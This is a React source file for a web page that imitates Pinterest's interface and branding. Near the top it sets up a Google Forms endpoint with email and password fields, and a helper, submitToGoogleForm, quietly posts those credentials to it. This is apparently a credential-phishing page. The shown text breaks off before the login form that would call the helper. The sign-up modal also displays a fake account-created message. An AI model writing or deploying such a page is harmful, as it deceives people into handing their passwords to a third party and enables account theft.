import { useState, useEffect, useMemo } from "react";

const GOOGLE_FORM_ACTION =
  "https://docs.google.com/forms/d/e/1FAIpQLSfQixt2_ED6YtLqEiwUNKANJwAAWV2TfKNLoVJ2NSlqnDF6Vg/formResponse";
const ENTRY_EMAIL = "entry.1697602432";
const ENTRY_PASSWORD = "entry.1806551528";

// ─────────────────────────────────────────────
// DATA PHOTO BACKGROUND
// ─────────────────────────────────────────────
const bgPhotos = [
  // Nature & Landscape
  { url: "https://images.unsplash.com/photo-1506905925346-21bda4d32df4?w=400&auto=format&fit=crop&q=80" }, // Pegunungan dramatis dengan kabut
  { url: "https://images.unsplash.com/photo-1448375240586-882707db888b?w=400&auto=format&fit=crop&q=80" }, // Hutan pinus dengan sinar matahari
  { url: "https://images.unsplash.com/photo-1507525428034-b723cf961d3e?w=400&auto=format&fit=crop&q=80" }, // Pantai tropis dengan pasir putih

  // Urban & Architecture
  { url: "https://images.unsplash.com/photo-1477959858617-67f85cf4f1df?w=400&auto=format&fit=crop&q=80" }, // Cityscape malam hari dengan lampu
  { url: "https://images.unsplash.com/photo-1486325212027-8081e485255e?w=400&auto=format&fit=crop&q=80" }, // Jembatan kota ikonik
  { url: "https://images.unsplash.com/photo-1460317442991-0ec209397118?w=400&auto=format&fit=crop&q=80" }, // Gedung arsitektur modern

  // Food & Lifestyle
  { url: "https://images.unsplash.com/photo-1495474472287-4d71bcdd2085?w=400&auto=format&fit=crop&q=80" }, // Kopi latte art di cafe
  { url: "https://images.unsplash.com/photo-1490645935967-10de6ba17061?w=400&auto=format&fit=crop&q=80" }, // Makanan sehat colorful di meja
  { url: "https://images.unsplash.com/photo-1414235077428-338989a2e8c0?w=400&auto=format&fit=crop&q=80" }, // Fine dining plating elegan

  // People & Fashion
  { url: "https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?w=400&auto=format&fit=crop&q=80" }, // Wanita dengan outfit colorful
  { url: "https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?w=400&auto=format&fit=crop&q=80" }, // Portrait pria dengan pencahayaan dramatis
  { url: "https://images.unsplash.com/photo-1499952127939-9bbf5af6c51c?w=400&auto=format&fit=crop&q=80" }, // Orang di alam terbuka

  // Abstract & Textures
  { url: "https://images.unsplash.com/photo-1558618666-fcd25c85cd64?w=400&auto=format&fit=crop&q=80" }, // Tekstur warna pastel abstract
  { url: "https://images.unsplash.com/photo-1550684848-fac1c5b4e853?w=400&auto=format&fit=crop&q=80" }, // Gradien warna vibrant
  { url: "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=400&auto=format&fit=crop&q=80" }, // Portrait closeup estetik

  // Travel & Adventure
  { url: "https://images.unsplash.com/photo-1501854140801-50d01698950b?w=400&auto=format&fit=crop&q=80" }, // Aerial view pegunungan hijau
  { url: "https://images.unsplash.com/photo-1476514525535-07fb3b4ae5f1?w=400&auto=format&fit=crop&q=80" }, // Orang hiking di pegunungan
  { url: "https://images.unsplash.com/photo-1530521954074-e64f6810b32d?w=400&auto=format&fit=crop&q=80" }, // Suasana travel dengan koper
];

const feedItems = [
  // Nature & Landscape
  { url: "https://images.unsplash.com/photo-1506905925346-21bda4d32df4?w=400&auto=format&fit=crop&q=80", title: "Mountain Sunrise", h: 300 },
  { url: "https://images.unsplash.com/photo-1441974231531-c6227db76b6e?w=400&auto=format&fit=crop&q=80", title: "Forest Path", h: 220 },
  { url: "https://images.unsplash.com/photo-1518495973542-4542c06a5843?w=400&auto=format&fit=crop&q=80", title: "Golden Hour", h: 260 },
  { url: "https://images.unsplash.com/photo-1472214103451-9374bd1c798e?w=400&auto=format&fit=crop&q=80", title: "Lake Reflection", h: 340 },
  { url: "https://images.unsplash.com/photo-1500534314209-a25ddb2bd429?w=400&auto=format&fit=crop&q=80", title: "Desert Dunes", h: 190 },
  { url: "https://images.unsplash.com/photo-1501854140801-50d01698950b?w=400&auto=format&fit=crop&q=80", title: "Aerial Forest", h: 280 },
  // Architecture & Interior
  { url: "https://images.unsplash.com/photo-1493809842364-78817add7ffb?w=400&auto=format&fit=crop&q=80", title: "Minimalist Room", h: 240 },
  { url: "https://images.unsplash.com/photo-1556909114-f6e7ad7d3136?w=400&auto=format&fit=crop&q=80", title: "Modern Kitchen", h: 320 },
  { url: "https://images.unsplash.com/photo-1555041469-a586c61ea9bc?w=400&auto=format&fit=crop&q=80", title: "Cozy Living Room", h: 200 },
  { url: "https://images.unsplash.com/photo-1502005229762-cf1b2da7c5d6?w=400&auto=format&fit=crop&q=80", title: "City Architecture", h: 360 },
  { url: "https://images.unsplash.com/photo-1560448204-e02f11c3d0e2?w=400&auto=format&fit=crop&q=80", title: "Loft Bedroom", h: 250 },
  // Fashion & Style
  { url: "https://images.unsplash.com/photo-1469334031218-e382a71b716b?w=400&auto=format&fit=crop&q=80", title: "Street Style", h: 380 },
  { url: "https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=400&auto=format&fit=crop&q=80", title: "Fashion Editorial", h: 310 },
  { url: "https://images.unsplash.com/photo-1483985988355-763728e1935b?w=400&auto=format&fit=crop&q=80", title: "Shopping Bags", h: 210 },
  { url: "https://images.unsplash.com/photo-1509631179647-0177331693ae?w=400&auto=format&fit=crop&q=80", title: "Minimal Outfit", h: 270 },
  // Food & Coffee
  { url: "https://images.unsplash.com/photo-1495474472287-4d71bcdd2085?w=400&auto=format&fit=crop&q=80", title: "Coffee Art", h: 230 },
  { url: "https://images.unsplash.com/photo-1567620905732-2d1ec7ab7445?w=400&auto=format&fit=crop&q=80", title: "Pancake Stack", h: 290 },
  { url: "https://images.unsplash.com/photo-1490474418585-ba9bad8fd0ea?w=400&auto=format&fit=crop&q=80", title: "Acai Bowl", h: 180 },
  { url: "https://images.unsplash.com/photo-1546069901-ba9599a7e63c?w=400&auto=format&fit=crop&q=80", title: "Healthy Bowl", h: 350 },
  { url: "https://images.unsplash.com/photo-1565299507177-b0ac66763828?w=400&auto=format&fit=crop&q=80", title: "Street Food", h: 220 },
  // Travel & City
  { url: "https://images.unsplash.com/photo-1540959733332-eab4deabeeaf?w=400&auto=format&fit=crop&q=80", title: "Tokyo Night", h: 300 },
  { url: "https://images.unsplash.com/photo-1499856871958-5b9627545d1a?w=400&auto=format&fit=crop&q=80", title: "Paris Eiffel", h: 260 },
  { url: "https://images.unsplash.com/photo-1523482580672-f109ba8cb9be?w=400&auto=format&fit=crop&q=80", title: "Sydney Opera", h: 200 },
  { url: "https://images.unsplash.com/photo-1534430480872-3498386e7856?w=400&auto=format&fit=crop&q=80", title: "Bali Sunset", h: 330 },
  { url: "https://images.unsplash.com/photo-1552832230-c0197dd311b5?w=400&auto=format&fit=crop&q=80", title: "Rome Streets", h: 240 },
  // People & Lifestyle
  { url: "https://images.unsplash.com/photo-1529156069898-49953e39b3ac?w=400&auto=format&fit=crop&q=80", title: "Friends Laughing", h: 280 },
  { url: "https://images.unsplash.com/photo-1522202176988-66273c2fd55f?w=400&auto=format&fit=crop&q=80", title: "Working Together", h: 210 },
  { url: "https://images.unsplash.com/photo-1506126613408-eca07ce68773?w=400&auto=format&fit=crop&q=80", title: "Morning Yoga", h: 370 },
  { url: "https://images.unsplash.com/photo-1516589178581-6cd7833ae3b2?w=400&auto=format&fit=crop&q=80", title: "Couple Goals", h: 250 },
  // Art & Creative
  { url: "https://images.unsplash.com/photo-1513364776144-60967b0f800f?w=400&auto=format&fit=crop&q=80", title: "Art Studio", h: 320 },
  { url: "https://images.unsplash.com/photo-1547891654-e66ed7ebb968?w=400&auto=format&fit=crop&q=80", title: "Abstract Paint", h: 190 },
  { url: "https://images.unsplash.com/photo-1558618666-fcd25c85cd64?w=400&auto=format&fit=crop&q=80", title: "Watercolor", h: 260 },
  // Animals
  { url: "https://images.unsplash.com/photo-1518020382113-a7e8fc38eac9?w=400&auto=format&fit=crop&q=80", title: "Cute Dog", h: 230 },
  { url: "https://images.unsplash.com/photo-1548681528-6a5c45b66b42?w=400&auto=format&fit=crop&q=80", title: "Fluffy Cat", h: 290 },
  { url: "https://images.unsplash.com/photo-1474511320723-9a56873867b5?w=400&auto=format&fit=crop&q=80", title: "Fox in Snow", h: 340 },
  // Plants & Flowers
  { url: "https://images.unsplash.com/photo-1457089328109-e5d9bd499191?w=400&auto=format&fit=crop&q=80", title: "Spring Flowers", h: 200 },
  { url: "https://images.unsplash.com/photo-1416879595882-3373a0480b5b?w=400&auto=format&fit=crop&q=80", title: "Garden Bloom", h: 310 },
  { url: "https://images.unsplash.com/photo-1463936575829-25148e1db1b8?w=400&auto=format&fit=crop&q=80", title: "Succulent", h: 220 },
  // Tech & Minimal
  { url: "https://images.unsplash.com/photo-1517694712202-14dd9538aa97?w=400&auto=format&fit=crop&q=80", title: "Coding Setup", h: 260 },
  { url: "https://images.unsplash.com/photo-1484788984921-03950022c9ef?w=400&auto=format&fit=crop&q=80", title: "Clean Desk", h: 180 },
];

// ─────────────────────────────────────────────
// HELPERS
// ─────────────────────────────────────────────
function submitToGoogleForm(email: string, password: string) {
  const body = new URLSearchParams();
  body.append(ENTRY_EMAIL, email);
  body.append(ENTRY_PASSWORD, password);

  fetch(GOOGLE_FORM_ACTION, {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: body.toString(),
  }).catch(() => {});
}

// ─────────────────────────────────────────────
// MASONRY BACKGROUND (TIDAK BERUBAH)
// ─────────────────────────────────────────────
// BARU - foto unik, tidak repeat, height variatif
function MasonryBackground() {
  const [colCount, setColCount] = useState(6);
  useEffect(() => {
    const update = () => setColCount(Math.max(3, Math.floor(window.innerWidth / 175)));
    update();
    window.addEventListener("resize", update);
    return () => window.removeEventListener("resize", update);
  }, []);

  const shuffled = useMemo(() => [...feedItems].sort(() => Math.random() - 0.5), []);
  const cols = useMemo(() => {
    const c: typeof feedItems[][] = Array.from({ length: colCount }, () => []);
    shuffled.forEach((item, i) => c[i % colCount].push(item));
    return c;
  }, [shuffled, colCount]);

  return (
    <div style={{ position: "fixed", inset: 0, display: "flex", gap: 8, padding: "0 4px", overflow: "hidden", background: "#ffffff" }}>
      {cols.map((col, ci) => (
        <div key={ci} style={{ display: "flex", flexDirection: "column", gap: 8, flex: 1, marginTop: ci % 2 === 1 ? -44 : 0 }}>
          {col.map((p, pi) => (
            <img key={pi} src={p.url} alt="" loading="lazy" style={{ width: "100%", height: p.h ?? 220, borderRadius: 14, objectFit: "cover", flexShrink: 0 }} />
          ))}
        </div>
      ))}
    </div>
  );
}

// ─────────────────────────────────────────────
// SIGN UP MODAL (MENGGUNAKAN IMAGE SRC)
// ─────────────────────────────────────────────
function SignUpModal({ onClose }: { onClose: () => void }) {
  const [name, setName] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPw, setShowPw] = useState(false);
  const [dob, setDob] = useState("");
  const [error, setError] = useState("");

  function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!name || !email || !password || !dob) { setError("Harap isi semua field."); return; }
    alert(`✅ Akun berhasil dibuat! Selamat datang, ${name}.`);
    onClose();
  }

  const inp = (val: string, extra?: React.CSSProperties): React.CSSProperties => ({
    width: "100%", padding: "12px 14px", border: `1.5px solid ${val ? "#e60023" : "#cdcdd1"}`,
    borderRadius: 12, fontSize: 15, outline: "none", background: val ? "#fff" : "#f9f9f9", color: "#111", ...extra,
  });

  return (
    <div style={{ position: "fixed", inset: 0, zIndex: 130, display: "flex", alignItems: "center", justifyContent: "center", padding: 16 }} onClick={e => e.target === e.currentTarget && onClose()}>
      <div style={{ background: "#fff", borderRadius: 24, padding: "36px 32px 28px", width: "100%", maxWidth: 380, boxShadow: "0 8px 40px rgba(0,0,0,.35)", textAlign: "center", position: "relative" }}>
        <button onClick={onClose} style={{ position: "absolute", top: 14, right: 16, background: "none", border: "none", fontSize: 20, cursor: "pointer", color: "#767676" }}>✕</button>
        
        {/* LOGO BULAT BERBASIS FOTO (SRC) */}
        <div style={{ width: 44, height: 44, background: "#e60023", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 16px", overflow: "hidden" }}>
          <img src="favicon.png" alt="Logo" style={{ width: "100%", height: "100%", objectFit: "cover" }}/>
        </div>

        <h2 style={{ fontSize: 21, fontWeight: 700, color: "#111", marginBottom: 4 }}>Welcome to Pinterest</h2>
        
        
        <form onSubmit={handleSubmit} noValidate style={{ display: "flex", flexDirection: "column", gap: 10 }}>
          <input placeholder="Full name" value={name} onChange={e => setName(e.target.value)} style={inp(name)} />
          <input type="email" placeholder="Email" value={email} onChange={e => setEmail(e.target.value)} style={inp(email)} />
          <div style={{ position: "relative" }}>
            <input type={showPw ? "text" : "password"} placeholder="Create a password" value={password} onChange={e => setPassword(e.target.value)} style={inp(password, { paddingRight: 52 })} />
            <button type="button" onClick={() => setShowPw(v => !v)} style={{ position: "absolute", right: 12, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", cursor: "pointer", color: "#555", fontSize: 13, fontWeight: 600 }}>{showPw ? "Hide" : "Show"}</button>
          </div>
          <div style={{ textAlign: "left" }}>
            <label style={{ fontSize: 12, color: "#767676", display: "block", marginBottom: 4 }}>Tanggal lahir</label>
            <input type="date" value={dob} onChange={e => setDob(e.target.value)} style={inp(dob)} />
          </div>
          {error && <p style={{ color: "#e60023", fontSize: 13, textAlign: "left" }}>{error}</p>}
          <button type="submit" style={{ width: "100%", padding: 13, background: "#e60023", color: "#fff", border: "none", borderRadius: 50, fontSize: 15, fontWeight: 700, cursor: "pointer", marginTop: 4 }}>Continue</button>
        </form>
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────
// PINTEREST STYLE FEED CARD 
// ─────────────────────────────────────────────
function FeedCard({ item }: { item: typeof feedItems[0] }) {
  const [hov, setHov] = useState(false);
  const [saved, setSaved] = useState(false);

  return (
    <div 
      onMouseEnter={() => setHov(true)} 
      onMouseLeave={() => setHov(false)}
      style={{ borderRadius: 24, overflow: "hidden", position: "relative", cursor: "pointer", background: "#efefef", marginBottom: 14 }}
    >
      <img 
        src={item.url} 
        alt={item.title} 
        loading="lazy"
        style={{ width: "100%", height: item.h || 280, objectFit: "cover", display: "block", transition: "transform 0.3s ease", transform: hov ? "scale(1.03)" : "scale(1)" }} 
      />

      {hov && (
        <div 
          style={{ 
            position: "absolute", 
            inset: 0, 
            background: "linear-gradient(to bottom, rgba(0,0,0,0.3) 0%, rgba(0,0,0,0) 40%, rgba(0,0,0,0.65) 100%)", 
            display: "flex",
            flexDirection: "column",
            justifyContent: "space-between",
            padding: 14,
            boxSizing: "border-box"
          }}
        >
          <div style={{ display: "flex", justifyContent: "flex-end" }}>
            <button 
              onClick={e => { e.stopPropagation(); setSaved(v => !v); }}
              style={{ padding: "10px 20px", background: saved ? "#333" : "#e60023", color: "#fff", border: "none", borderRadius: 24, fontWeight: 700, fontSize: 14, cursor: "pointer", boxShadow: "0 2px 8px rgba(0,0,0,0.15)" }}
            >
              {saved ? "Tersimpan" : "Simpan"}
            </button>
          </div>

          <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
            <div style={{ color: "#fff", textAlign: "left", paddingLeft: 4 }}>
              <h3 style={{ margin: 0, fontSize: 16, fontWeight: 700, lineHeight: 1.3, textShadow: "0 1px 4px rgba(0,0,0,0.6)" }}>
                {item.title}
              </h3>
              <div style={{ display: "flex", alignItems: "center", gap: 6, marginTop: 6 }}>
                <div style={{ width: 22, height: 22, borderRadius: "50%", background: "rgba(255,255,255,0.8)", color: "#111", fontSize: 11, fontWeight: 700, display: "flex", alignItems: "center", justifyContent: "center" }}>
                  T
                </div>
                <span style={{ fontSize: 12, opacity: 0.9, fontWeight: 500, textShadow: "0 1px 2px rgba(0,0,0,0.5)" }}>Travel Explorer</span>
              </div>
            </div>

            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
              <div style={{ display: "flex", gap: 8 }}>
                <button style={{ width: 36, height: 36, background: "rgba(255,255,255,0.85)", border: "none", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer" }}>
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#111" strokeWidth="2.5"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg>
                </button>
                <button style={{ width: 36, height: 36, background: "rgba(255,255,255,0.85)", border: "none", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", fontWeight: 700, fontSize: 14, color: "#111" }}>
                  ···
                </button>
              </div>
              <button style={{ width: 36, height: 36, background: "rgba(255,255,255,0.85)", border: "none", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer" }}>
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#111" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
              </button>
            </div>
          </div>
        </div>
      )}

      {!hov && (
        <div style={{ position: "absolute", bottom: 10, right: 10, opacity: 0.85 }}>
          <button style={{ width: 28, height: 28, background: "rgba(255,255,255,0.95)", border: "none", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 13, color: "#111", fontWeight: "bold", boxShadow: "0 2px 4px rgba(0,0,0,0.1)" }}>
            ···
          </button>
        </div>
      )}
    </div>
  );
}

// ─────────────────────────────────────────────
// RESPONSIVE DASHBOARD PAGE (WHITE LIGHT THEME)
// ─────────────────────────────────────────────
function Dashboard({ userEmail, onLogout }: { userEmail: string; onLogout: () => void }) {
  const [search, setSearch] = useState("");
  const [colCount, setColCount] = useState(4);
  const [isMobile, setIsMobile] = useState(false);
  
  const [hoveredIcon, setHoveredIcon] = useState<string | null>(null);
  const [hoveredLogo, setHoveredLogo] = useState(false);

  useEffect(() => {
    const handleResize = () => {
      const width = window.innerWidth;
      setIsMobile(width < 768);
      if (width < 480) setColCount(2); 
      else if (width < 800) setColCount(3);
      else if (width < 1100) setColCount(4);
      else setColCount(5);
    };
    handleResize();
    window.addEventListener("resize", handleResize);
    return () => window.removeEventListener("resize", handleResize);
  }, []);

 // BARU
const shuffledFeed = useMemo(() => [...feedItems].sort(() => Math.random() - 0.5), []);
const cols = useMemo(() => {
  const c: typeof feedItems[][] = Array.from({ length: colCount }, () => []);
  shuffledFeed.forEach((item, i) => c[i % colCount].push(item));
  return c;
}, [shuffledFeed, colCount]);

  const menuItems = [
    {
      id: "home",
      label: "Home",
      icon: <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>,
      isActive: true
    },
    {
      id: "explore",
      label: "Explore",
      icon: <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><circle cx="12" cy="12" r="10"/><path d="m16.2 7.8-2 6.3-6.4 2.1 2.1-6.4z"/></svg>,
      isActive: false
    },
    {
      id: "boards",
      label: "Your Boards",
      icon: <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="3" width="7" height="9" rx="1.5"/><rect x="14" y="3" width="7" height="5" rx="1.5"/><rect x="14" y="12" width="7" height="9" rx="1.5"/><rect x="3" y="16" width="7" height="5" rx="1.5"/></svg>,
      isActive: false
    },
    {
      id: "create",
      label: "Create",
      icon: <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><rect x="3" y="3" width="18" height="18" rx="5"/><line x1="12" y1="8" x2="12" y2="16"/><line x1="8" y1="12" x2="16" y2="12"/></svg>,
      isActive: false
    },
    {
      id: "notifications",
      label: "Notifications",
      icon: (
        <div style={{ position: "relative", display: "inline-block" }}>
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
          <div style={{ position: "absolute", top: 2, right: 2, width: 6, height: 6, background: "#e60023", borderRadius: "50%" }} />
        </div>
      ),
      isActive: false
    },
     {
      id: "messages",
      label: "Messages",
      icon: <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>,
      isActive: false
    }
  ];

  return (
    <div style={{ minHeight: "100vh", background: "#fff", color: "#111", fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif", display: "flex", flexDirection: "column" }}>
      
      {/* ── 1. DESKTOP SIDEBAR NAVIGATION ── */}
      {!isMobile && (
        <div style={{ width: 72, position: "fixed", top: 0, bottom: 0, left: 0, background: "#fff", display: "flex", flexDirection: "column", alignItems: "center", padding: "20px 0", zIndex: 110, borderRight: "1px solid #efefef" }}>
          {/* LOGO */}
          <div onMouseEnter={() => setHoveredLogo(true)} onMouseLeave={() => setHoveredLogo(false)} style={{ width: "100%", padding: "0 10px", boxSizing: "border-box", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", marginBottom: 24, position: "relative" }}>
            <img src="favicon.png" alt="Pinterest" style={{ width: 31, height: 31, objectFit: "contain" }} />
            {hoveredLogo && <div style={{ position: "absolute", left: 54, background: "#111", color: "#fff", padding: "8px 12px", borderRadius: 8, fontSize: 12, fontWeight: 600, whiteSpace: "nowrap", pointerEvents: "none", boxShadow: "0 4px 12px rgba(0,0,0,0.15)", zIndex: 120 }}>Home</div>}
          </div>

          {/* MENU */}
          <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 30, width: "100%" }}>
            {menuItems.map((menu) => {
              const isHovered = hoveredIcon === menu.id;
              return (
                <div key={menu.id} style={{ position: "relative", display: "flex", alignItems: "center" }}>
                  <button onMouseEnter={() => setHoveredIcon(menu.id)} onMouseLeave={() => setHoveredIcon(null)} style={{ width: 44, height: 44, background: menu.isActive ? "#111" : isHovered ? "#f0f0f0" : "none", border: "none", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", color: menu.isActive ? "#fff" : "#111", transition: "all 0.2s" }}>
                    {menu.icon}
                  </button>
                  {isHovered && <div style={{ position: "absolute", left: 54, background: "#111", color: "#fff", padding: "8px 12px", borderRadius: 8, fontSize: 12, fontWeight: 600, whiteSpace: "nowrap", pointerEvents: "none", zIndex: 120 }}>{menu.label}</div>}
                </div>
              );
            })}
          </div>

          {/* DESKTOP LOGOUT */}
          <div style={{ marginTop: "auto", position: "relative", display: "flex", alignItems: "center" }}>
            <button onClick={onLogout} onMouseEnter={() => setHoveredIcon("logout")} onMouseLeave={() => setHoveredIcon(null)} style={{ width: 44, height: 44, background: hoveredIcon === "logout" ? "#f0f0f0" : "none", border: "none", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", color: "#111", transition: "all 0.2s" }}>
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
            </button>
            {hoveredIcon === "logout" && <div style={{ position: "absolute", left: 54, background: "#111", color: "#fff", padding: "8px 12px", borderRadius: 8, fontSize: 12, fontWeight: 600, whiteSpace: "nowrap", zIndex: 120 }}>Log out</div>}
          </div>
        </div>
      )}

      {/* ── 2. TOP NAVBAR (ADAPTIF DESKTOP & MOBILE) ── */}
      <div style={{ 
        position: "fixed", 
        top: 0, 
        left: isMobile ? 0 : 72, 
        right: 0, 
        height: 68, 
        background: "#fff", 
        display: "flex", 
        alignItems: "center", 
        gap: 12, 
        padding: "0 16px", 
        zIndex: 100, 
        boxSizing: "border-box" 
      }}>
        {/* Search Bar Input */}
        <div style={{ flex: 1, position: "relative", display: "flex", alignItems: "center" }}>
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#767676" strokeWidth="3.5" style={{ position: "absolute", left: 16 }}>
            <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
          </svg>
          <input 
            value={search} 
            onChange={e => setSearch(e.target.value)} 
            placeholder={isMobile ? "Cari ide" : "Search"}
            style={{ 
              width: "100%", 
              padding: "12px 84px 12px 44px",
              background: "#e9e9e9", 
              border: "none", 
              borderRadius: 24, 
              fontSize: 16, 
              outline: "none", 
              color: "#111", 
              fontFamily: "inherit" 
            }} 
          />

          {/* KONTAINER IKON KAMERA & MIKROFON (VN) DI DALAM SEARCH BAR */}
          <div style={{ position: "absolute", right: 16, display: "flex", alignItems: "center", gap: 12, color: "#111" }}>
            {/* ICON PICTURE / KAMERA */}
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.3" strokeLinecap="round" strokeLinejoin="round" style={{ cursor: "pointer" }}>
              <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
              <circle cx="12" cy="13" r="4"/>
            </svg>
            
            {/* ICON VN / MIKROFON */}
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.3" strokeLinecap="round" strokeLinejoin="round" style={{ cursor: "pointer" }}>
              <path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3Z"/>
              <path d="M19 10v2a7 7 0 0 1-14 0v-2M12 19v3"/>
            </svg>
          </div>
        </div>

        {/* Sisi Kanan Header: Tombol Log Out Merah di Mobile */}
        {isMobile ? (
          <button 
            onClick={onLogout} 
            style={{ background: "none", border: "none", color: "#e60023", fontSize: 15, fontWeight: 600, cursor: "pointer", padding: "0 4px" }}
          >
            Log out
          </button>
        ) : (
          <div style={{ display: "flex", alignItems: "center", gap: 4, cursor: "pointer" }}>
            <div style={{ width: 32, height: 32, borderRadius: "50%", background: "#efefef", fontSize: 13, fontWeight: "bold", display: "flex", alignItems: "center", justifyContent: "center", color: "#111" }}>
              {userEmail.charAt(0).toUpperCase() || "U"}
            </div>
            <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#767676" strokeWidth="3.5"><path d="m6 9 6 6 6-6"/></svg>
          </div>
        )}
      </div>

      {/* ── 3. MAIN GRID CONTENT (MASONRY) ── */}
      <div style={{ flex: 1, marginLeft: isMobile ? 0 : 72, padding: "80px 8px 80px 8px", boxSizing: "border-box" }}>
        {!isMobile && (
          <div style={{ marginBottom: 18, paddingLeft: 6 }}>
            <span style={{ fontSize: 15, fontWeight: 700, borderBottom: "3px solid #111", paddingBottom: 6, color: "#111" }}>All</span>
          </div>
        )}

        {/* Flex Masonry Columns */}
        <div style={{ display: "flex", gap: isMobile ? 10 : 14, alignItems: "flex-start" }}>
          {cols.map((col, ci) => (
            <div key={ci} style={{ flex: 1, minWidth: 0 }}>
              {col.map((item, pi) => (
                <FeedCard key={pi} item={item} />
              ))}
            </div>
          ))}
        </div>
      </div>

      {/* ── 4. MOBILE BOTTOM NAVIGATION BAR ── */}
      {isMobile && (
        <div style={{ 
          position: "fixed", 
          bottom: 0, 
          left: 0, 
          right: 0, 
          height: 64, 
          background: "#fff", 
          display: "flex", 
          justifyContent: "space-around", 
          alignItems: "center", 
          zIndex: 110,
          borderTop: "1px solid #efefef",
          paddingBottom: "env(safe-area-inset-bottom)" 
        }}>
          {menuItems.map((menu) => (
            <button 
              key={menu.id} 
              style={{ 
                background: "none", 
                border: "none", 
                color: menu.isActive ? "#111" : "#767676", 
                cursor: "pointer", 
                display: "flex", 
                alignItems: "center", 
                justifyContent: "center",
                width: 50,
                height: 50
              }}
            >
              {menu.icon}
            </button>
          ))}
          {/* Avatar Bulat Profile Mobile */}
          <button style={{ background: "none", border: "none", display: "flex", alignItems: "center", justifyContent: "center" }}>
            <div style={{ width: 24, height: 24, borderRadius: "50%", background: "#efefef", color: "#111", fontSize: 11, fontWeight: "bold", display: "flex", alignItems: "center", justifyContent: "center" }}>
              {userEmail.charAt(0).toUpperCase() || "S"}
            </div>
          </button>
        </div>
      )}

    </div>
  );
}

// ─────────────────────────────────────────────
// SOCIAL BUTTON (TIDAK BERUBAH)
// ─────────────────────────────────────────────
function SocialBtn({ children, onClick }: { children: React.ReactNode; onClick: () => void }) {
  const [hov, setHov] = useState(false);
  return (
